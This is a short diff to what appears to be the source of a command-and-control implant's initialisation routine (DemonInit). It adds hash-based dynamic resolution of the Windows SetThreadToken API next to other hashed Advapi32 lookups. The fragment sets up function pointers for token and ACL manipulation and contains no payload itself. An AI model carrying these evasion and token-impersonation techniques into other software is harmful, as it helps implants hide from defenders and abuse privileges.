@@ -652,6 +652,7 @@ VOID DemonInit( VOID )
         Instance.Win32.InitializeAcl                       = LdrFunctionAddr( Instance.Modules.Advapi32, 0x62cac4c7 );
         Instance.Win32.AllocateAndInitializeSid            = LdrFunctionAddr( Instance.Modules.Advapi32, 0x57a4ccf  );
         Instance.Win32.SetEntriesInAclW                    = LdrFunctionAddr( Instance.Modules.Advapi32, 0xe2d6b8e9 );
+        Instance.Win32.SetThreadToken                      = LdrFunctionAddr( Instance.Modules.Advapi32, 0x575b17ca );
 
         PUTS( "Loaded Advapi32 functions" )
     }
